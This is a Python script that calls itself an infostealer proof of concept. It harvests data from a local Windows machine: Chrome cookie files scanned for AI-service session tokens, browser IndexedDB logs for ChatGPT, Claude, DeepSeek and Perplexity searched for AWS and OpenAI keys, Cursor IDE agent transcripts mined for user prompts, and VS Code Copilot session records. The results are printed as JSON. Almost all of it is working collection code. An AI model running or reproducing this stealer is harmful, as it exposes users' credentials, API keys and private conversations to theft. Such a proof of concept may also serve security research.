import os
import sys
import json
import re
import sqlite3
import time
from datetime import datetime

def steal_llm_artifacts():
    start_time = time.time()
    home = os.path.expanduser("~")
    local_app = os.environ.get("LOCALAPPDATA", "")
    app_data = os.environ.get("APPDATA", "")
    
    stolen_data = {
        "execution_time_ms": 0,
        "session_cookies": [],
        "secrets_found": [],
        "carved_prompts_summary": {
            "chatgpt": 0,
            "claude": 0,
            "cursor": 0,
            "vscode_copilot": 0,
            "deepseek": 0,
            "perplexity": 0
        },
        "extracted_prompts_sample": []
    }
    
    # 1. Steal Chrome Session Cookies & Keys
    cookie_db = os.path.join(local_app, "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    if not os.path.exists(cookie_db):
        cookie_db = os.path.join(local_app, "Google", "Chrome", "User Data", "Default", "Cookies")
        
    if os.path.exists(cookie_db):
        try:
            # Direct binary scan for session token strings without sqlite lock issues
            with open(cookie_db, 'rb') as f:
                content = f.read()
            # Search for typical session tokens
            tokens = re.findall(r'(__Secure-next-auth\.session-token|sessionKey|claude_session_secret|persist%3A[a-zA-Z0-9_-]+)[^\x00-\x1F\x7F-\xFF]{10,200}', content.decode('utf-8', errors='ignore'))
            for t in set(tokens[:10]):
                stolen_data["session_cookies"].append({"source": "Chrome Cookies", "match": t[:30] + "..."})
        except Exception:
            pass
            
    # 2. Fast Steal LevelDB Logs (ChatGPT, Claude, DeepSeek, Perplexity)
    idb_path = os.path.join(local_app, "Google", "Chrome", "User Data", "Default", "IndexedDB")
    if os.path.exists(idb_path):
        for folder in os.listdir(idb_path):
            if folder.endswith(".indexeddb.leveldb"):
                folder_path = os.path.join(idb_path, folder)
                platform = "unknown"
                if "chatgpt" in folder:
                    platform = "chatgpt"
                elif "claude" in folder:
                    platform = "claude"
                elif "deepseek" in folder:
                    platform = "deepseek"
                elif "perplexity" in folder:
                    platform = "perplexity"
                else:
                    continue
                    
                for f in os.listdir(folder_path):
                    if f.endswith(".log"):
                        log_p = os.path.join(folder_path, f)
                        try:
                            with open(log_p, 'rb') as lf:
                                data = lf.read()
                            text = data.decode('utf-8', errors='ignore')
                            
                            # Secrets regex scan
                            aws_keys = re.findall(r'\b(AKIA|AGPA|AIDA|AROA)[A-Z0-9]{16}\b', text)
                            for k in aws_keys:
                                stolen_data["secrets_found"].append({"type": "AWS Access Key", "match": k})
                                
                            openai_keys = re.findall(r'\bsk-[a-zA-Z0-9]{32,60}\b', text)
                            for k in openai_keys:
                                stolen_data["secrets_found"].append({"type": "OpenAI Key", "match": k[:10] + "..."})

                            # Quick prompt count
                            if platform == "chatgpt":
                                count = text.count('"messages"')
                                stolen_data["carved_prompts_summary"]["chatgpt"] += count
                            elif platform == "claude":
                                count = text.count('"tipTapEditorState"')
                                stolen_data["carved_prompts_summary"]["claude"] += count
                            elif platform in ["deepseek", "perplexity"]:
                                count = text.count('"content"')
                                stolen_data["carved_prompts_summary"][platform] += count
                        except Exception:
                            pass

    # 3. Fast Steal Cursor IDE Transcripts
    cursor_dir = os.path.join(home, ".cursor", "projects")
    if os.path.exists(cursor_dir):
        for root, dirs, files in os.walk(cursor_dir):
            for f in files:
                if f.endswith(".jsonl") and "agent-transcripts" in root:
                    fp = os.path.join(root, f)
                    try:
                        with open(fp, 'r', encoding='utf-8', errors='ignore') as jf:
                            for line in jf:
                                if "<user_query>" in line:
                                    stolen_data["carved_prompts_summary"]["cursor"] += 1
                                    uq = re.search(r'<user_query>\n?(.*?)\n?</user_query>', line, re.DOTALL)
                                    if uq and len(stolen_data["extracted_prompts_sample"]) < 3:
                                        stolen_data["extracted_prompts_sample"].append({
                                            "platform": "Cursor IDE",
                                            "prompt": uq.group(1).strip()[:100] + "..."
                                        })
                    except Exception:
                        pass
                        
    # 4. Fast Steal VS Code Copilot State
    vscode_db = os.path.join(app_data, "Code", "User", "globalStorage", "state.vscdb")
    if os.path.exists(vscode_db):
        try:
            conn = sqlite3.connect(vscode_db)
            cursor = conn.cursor()
            cursor.execute("SELECT value FROM itemTable WHERE key LIKE '%copilot%' OR key LIKE '%interactive.sessions%'")
            rows = cursor.fetchall()
            stolen_data["carved_prompts_summary"]["vscode_copilot"] += len(rows)
            conn.close()
        except Exception:
            pass

    elapsed = (time.time() - start_time) * 1000
    stolen_data["execution_time_ms"] = round(elapsed, 2)
    return stolen_data

if __name__ == "__main__":
    result = steal_llm_artifacts()
    print("=" * 70)
    print(" [!] VERITY LIGHTNING INFOSTEALER PoC (HEADLESS EXECUTION)")
    print(" Target: Local Chromium LevelDB, Cursor IDE, VS Code Copilot")
    print("=" * 70)
    print(json.dumps(result, indent=2))
    print("=" * 70)
